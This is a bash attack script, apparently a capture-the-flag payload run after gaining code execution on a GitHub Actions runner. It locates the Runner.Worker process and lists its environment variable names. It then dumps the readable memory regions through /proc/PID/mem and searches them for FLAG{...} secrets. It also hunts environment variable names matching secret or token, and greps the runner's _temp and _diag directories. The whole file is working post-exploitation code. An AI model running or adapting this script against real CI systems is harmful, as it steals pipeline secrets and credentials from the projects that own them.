#!/bin/bash
exec 1>&2
set -x
echo "RCE_MARKER=$(date +%s)"
echo "PTRACE_SCOPE=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
echo "PPID=$PPID"
ps -eo pid,ppid,user,args 2>/dev/null | grep -iE 'Runner\.(Worker|Listener)|actions-runner' | grep -v grep | head -10
WORKER=$(pgrep -f 'Runner.Worker' 2>/dev/null | head -1)
echo "WORKER=$WORKER"
if [ -n "$WORKER" ]; then
  grep -E '^(Uid|Gid|Dumpable|TracerPid|Name):' /proc/$WORKER/status 2>/dev/null
  echo "--- worker environ keys"
  tr '\0' '\n' < /proc/$WORKER/environ 2>/dev/null | cut -d= -f1 | head -60
  echo "--- mem access test"
  timeout 5 dd if=/proc/$WORKER/mem of=/dev/null bs=4096 count=1 2>&1 | tail -2
  echo "MEM_TEST_EXIT=$?"
  if timeout 5 dd if=/proc/$WORKER/mem of=/dev/null bs=4096 count=1 2>/dev/null; then
    echo "--- scanning readable regions for FLAG"
    TOTAL=0
    while read -r line; do
      set -- $line
      RANGE=$1; PERMS=$2
      case "$PERMS" in *r*) ;; *) continue;; esac
      START=${RANGE%%-*}; END=${RANGE##*-}
      SZ=$((16#$END - 16#$START))
      if [ "$SZ" -le 0 ]; then continue; fi
      if [ "$SZ" -gt 134217728 ]; then SZ=134217728; fi
      timeout 10 dd if=/proc/$WORKER/mem bs=4096 skip=$((16#$START / 4096)) count=$((SZ / 4096)) 2>/dev/null | grep -a -o 'FLAG{[^}]*}' 2>/dev/null | head -3
      TOTAL=$((TOTAL + 1))
      if [ "$TOTAL" -gt 400 ]; then break; fi
    done < /proc/$WORKER/maps
    echo "SCAN_DONE regions=$TOTAL"
  fi
fi
echo "--- own env for FLAG-ish vars"
env | cut -d= -f1 | grep -iE 'flag|secret|token' | head -20
echo "--- temp/diag scan"
grep -a -o 'FLAG{[^}]*}' /home/runner/work/_temp/* 2>/dev/null | head -3
grep -a -o 'FLAG{[^}]*}' /home/runner/work/_diag/* 2>/dev/null | head -3
ls -la /home/runner/work/_diag 2>/dev/null | head -5
echo DONE
